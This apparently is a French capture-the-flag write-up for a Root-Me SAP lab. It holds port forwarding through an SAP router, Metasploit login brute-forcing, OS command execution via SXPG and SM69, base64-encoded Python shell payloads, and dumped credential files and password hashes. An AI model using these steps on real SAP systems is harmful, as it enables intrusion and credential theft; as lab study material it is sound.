@@ -1,0 +1,125 @@
+
+python router_admin.py -d ctf03.root-me.org -p 3299 -v -l --router-version 38
+=> Nous donne l'adresse interne du routeur SAP
+
+python port_forward.py -d ctf08.root-me.org -p 3299 -v -t 172.16.13.37 -r 8000 -a 127.0.0.1 -l 8000
+=> Crée un proxy web en 127.0.0.1:8000
+
+http://127.0.0.1:8000/sap/public/info
+=> Retourne les infos
+<SOAP-ENV:Envelope>
+<SOAP-ENV:Body>
+<rfc:RFC_SYSTEM_INFO.Response>
+<RFCSI>
+  <RFCPROTO>011</RFCPROTO>
+  <RFCCHARTYP>4103</RFCCHARTYP>
+  <RFCINTTYP>LIT</RFCINTTYP>
+  <RFCFLOTYP>IE3</RFCFLOTYP>
+  <RFCDEST>saprootme_NPL_00</RFCDEST>
+  <RFCHOST>saprootm</RFCHOST>
+  <RFCSYSID>NPL</RFCSYSID>
+  <RFCDATABS>NPL</RFCDATABS>
+  <RFCDBHOST>saprootme</RFCDBHOST>
+  <RFCDBSYS>SYBASE</RFCDBSYS>
+  <RFCSAPRL>740</RFCSAPRL>
+  <RFCMACH>  390</RFCMACH>
+  <RFCOPSYS>Linux</RFCOPSYS>
+  <RFCTZONE>  3600</RFCTZONE>
+  <RFCDAYST>X</RFCDAYST>
+  <RFCIPADDR>172.16.13.37</RFCIPADDR>
+  <RFCKERNRL>742</RFCKERNRL>
+  <RFCHOST2>saprootme</RFCHOST2>
+  <RFCSI_RESV/>
+  <RFCIPV6ADDR>172.16.13.37</RFCIPV6ADDR>
+</RFCSI>
+</rfc:RFC_SYSTEM_INFO.Response>
+</SOAP-ENV:Body>
+</SOAP-ENV:Envelope>
+
+
+
+set CLIENT 005
+set HttpPassword ADMIN
+set HttpUsername SAPCPIC
+set RPORT 8000
+set RHOSTS localhost
+run
+
+
+On trouve tous les types d'URL en utilisant le module auxiliary/scanner/sap/sap_icm_urlscan de metasploit.
+En allant sur http://127.0.0.1:8000/sap/admin/public/index.html on peut voir pas mal de choses
+En allant sur http://127.0.0.1:8000/sap/bc/gui/sap/its/webgui on peut voir les mandants utilisés
+
+On peut se log à la page
+http://127.0.0.1:8000/sap/bc/soap/rfc?sap-client=005&sap-language=EN
+avec les identifiants SAPCPIC:ADMIN
+(trouvés avec le module auxiliary/scanner/sap/sap_soap_rfc_brute_login de metasploit)
+
+use auxiliary/scanner/sap/sap_soap_rfc_sxpg_call_system_exec
+set CMD cat
+set PARAM /passwd
+
+=> a7184af7f6834a1caf206d3cb7298c4f
+
+
+/usr/sap/NPL/SYS/global/security/data/JUpgrade.properties
+Output
+   ------
+   #Fri Nov 21 13:28:36 UTC 2014
+   #SAP Secure Store file - Don&#39;t edit this file manually!
+   $internal/check=Awz8SWPThtakw3FhU1QlG/WEsCfln2lU
+   $internal/mode=encrypted
+   $internal/version=Ny4wMC4wMDAuMDAx
+   SapSystemInstance[0].SidAdmUserPassword=//n//8DgmAoZqX51uinMtBrYAqc5cZ39Hz4JkUldUa5CMaXBPgoaxw\=\=
+   SapSystemInstance[1].SidAdmUserPassword=//n//8DgmAoZqX51uinMtBrYAqc5cZ39Hz4JkUldUa5CMaXBPgoaxw\=\=
+
+/usr/sap/NPL/SYS/global/security/data/icmauth.txt
+webadm:$apr1$eu6NFUxq$X/ZmXWyZwXCgET42sqXUU.:admin
+
+
+Transaction SE17 avec table USR02 et tout sélectionné :
+D850998E17B1925F75A90B960369903C2BB27CFE : DDIC
+1D2F369C5504D39B1A192C11F9AA8EC995C2A7CC : SAP*
+38AE55102813F3BBBC3B3BCA09285ED5A9E0423F : SAPCPIC
+D5CD7EE158BE44D0EB04245E5340DFBC9B13E785 : TMSADM
+
+54F9C735D374DD32 : DDIC
+C3E73232CF792235 : SAP*
+7D806C248F03813D : SAPCPIC
+0CD1DDFE1C8C8D4A : TMSADM
+
+2 autres dans USH02 :
+E004A5E07BDE32D2126D4878CCEB3FCFCDC4C27C : SAPCPIC
+56479903BFC2E24C87F8229C64E4E8BDB751D2A1 : SAP*
+
+=> SAP*:SAPPHIRE
+
+On se connecte en tant que SAP007 et on va lire ZFLAG en utilisant la transaction SE17 : Uh_Oh_(O o)_I_Can_Change_My_Company_DataaAAAA!!
+
+Ensuite on peut exécuter n'importe quelle commande de la manière suivante :
+transaction SM69, ajouter une nouvelle commande, /usr/bin/python
+L'exécuter en ajoutant -c print("oooo") => affiche oooo
+Pour exécuter n'importe quoi sur le serveur, on encode la commande en base64 puis :
+-c b=__import__("base64");open("y","w").write(b.b64decode("aW1wb3J0IG9zDQpvcy5zeXN0ZW0oJ2ZpbmQgL3Vzci9zYXAvTlBMLz50bXAmJyk="))
+-c b=__import__("base64");open("y","w").write(b.b64decode("aW1wb3J0IG9zDQpvcy5zeXN0ZW0oJ2ZpbmQgL3Vzci9zYXAvTlBML3xoZWFkJyk="))
+-c b=__import__("base64");open("y","w").write(b.b64decode("aW1wb3J0IG9zDQpvcy5zeXN0ZW0oJ2xzIC1BbDsgcHdkJyk="))
+-c b=__import__("base64");open("y","w").write(b.b64decode("aW1wb3J0IG9zDQpvcy5zeXN0ZW0oJ2Vudicp")) //env
+-c b=__import__("base64");open("y","w").write(b.b64decode("aW1wb3J0IG9zDQpvcy5zeXN0ZW0oJ2xzIC1BbCAvc3liYXNlL05QTCcp"))
+Puis on exécute y
+
+./craft_specific_payload.py ZZ_python '-c b=__import__("base64");open("y","w").write(b.b64decode("aW1wb3J0IG9zLHN5cyxiYXNlNjQNCm9zLnN5c3RlbShiYXNlNjQuYjY0ZGVjb2RlKHN5cy5hcmd2WzFdKSk="))' 9 //interactive shell
+./craft_specific_payload.py ZZ_python "y $(base64<<<'uname -a')" 9
+
+
+Il y a des scripts admin qui détiennent les identifiants de la BDD :
+./craft_specific_payload.py ZZ_python "y $(base64<<<'base64</home/npladm/scripts/SAP_unlock_users.sh')"
+
+On modifie un peu le script pour voir ce qu'il y a dans la base de données avec le script "craft_final_request.py" :
+python craft_final_request.py "sp_help"
+=> une table "ZFLAG" apparaît
+
+python craft_final_request.py "select * from SAPSR3.ZFLAG"
+=> On obtient le deuxième flag : Willkommen_In_Der_SAP-Business-Security-Community_:)
+
+By the way pour valider le ctf ATD :
+./craft_specific_payload.py ZZ_python "y $(base64<<<'cat /passwd')" 0
